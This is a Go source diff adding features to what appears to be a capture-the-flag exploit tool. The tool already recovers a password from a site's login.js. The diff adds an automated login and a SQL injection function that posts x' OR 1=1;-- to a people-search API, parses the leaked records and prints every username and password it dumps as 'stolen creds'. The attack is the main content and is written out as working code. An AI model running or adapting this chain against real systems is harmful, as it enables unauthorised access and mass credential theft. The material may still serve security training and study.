@@ -1,10 +1,12 @@
 package main
 
 import (
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
 	"os"
 	"regexp"
@@ -30,6 +32,23 @@ type Client struct {
 	baseURL string
 	Route   string
 	Session *http.Client
+}
+
+type CookieJar struct {
+	jar map[string][]*http.Cookie
+}
+
+type PeopleReturn struct {
+	Returned []People
+}
+
+type People struct {
+	Data []Person
+}
+
+type Person struct {
+	Name     string `json:"namePeople"`
+	Password string `json:"passwordPeople"`
 }
 
 func cleanLetter(letter string) (cleaned_letter string) {
@@ -184,6 +203,88 @@ func (c *Client) GetScript(outfile string) (success bool, message string) {
 	return true, "login script successfully pulled down"
 }
 
+func (c *Client) Login(username string, password string) (success bool, message string) {
+	targetURL := fmt.Sprintf("%s/login.php", c.baseURL)
+	formData := fmt.Sprintf("email=%s&password=%s", username, password)
+
+	// attempt login
+	SysMsgNB("attempting login")
+	resp, err := c.Session.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(formData))
+	if err != nil {
+		return false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	resBody, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	cookieURL, err := url.Parse(c.baseURL)
+	if err != nil {
+		return false, err.Error()
+	}
+	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())
+
+	// confirm access to user pannel
+	req, err := http.NewRequest("GET", fmt.Sprintf("%s/index.html", c.baseURL), nil)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	SysMsgNB("confirming access to user pannel")
+	resp, err = c.Session.Do(req)
+	if err != nil {
+		return false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	resBody, err = ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	upPat := "<title>User Pannel</title>"
+	re, err := regexp.Compile(upPat)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	matches := re.FindAll(resBody, -1)
+	if len(matches) < 1 {
+		return false, "Unable to confirm access to user pannel"
+	}
+
+	return true, "login successful"
+}
+
+func (c *Client) SQLiAttack() (creds []Person, success bool, message string) {
+	var jsonPeople = [][]*Person{}
+	var credsArray []Person
+
+	targetURL := fmt.Sprintf("%s/api/people/search", c.baseURL)
+	sqli_string := "x' OR 1=1;--"
+	bodyString := fmt.Sprintf("namePeople=%s", sqli_string)
+
+	SysMsgNB("attempting SQLi attack")
+	resp, err := c.Session.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(bodyString))
+	if err != nil {
+		return nil, false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	respBody, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, false, err.Error()
+	}
+
+	json.Unmarshal(respBody, &jsonPeople)
+	for i := range jsonPeople[0] {
+		credsArray = append(credsArray, *jsonPeople[0][i])
+	}
+	return credsArray, true, "SQLi successful"
+}
+
 func SucMsg(msg string) {
 	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
 	return
@@ -229,6 +330,12 @@ func main() {
 
 	c := Client{baseURL: baseURL, Session: &http.Client{Timeout: 30 * time.Second}}
 	c.Route = "js/login.js"
+	sessionjar, err := cookiejar.New(nil)
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+	c.Session.Jar = sessionjar
 
 	success, message := c.GetScript("login.js")
 	if !success {
@@ -243,6 +350,25 @@ func main() {
 		os.Exit(1)
 	}
 	SucMsg(fmt.Sprintf("Login Credentials: \"daedalus:%s\"", password))
+
+	success, message = c.Login("daedalus", password)
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
+
+	creds, success, message := c.SQLiAttack()
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
+
+	// display stolen creds
+	for i := range creds {
+		SucMsg(fmt.Sprintf("%s:%s", creds[i].Name, creds[i].Password))
+	}
 	return
 }
 
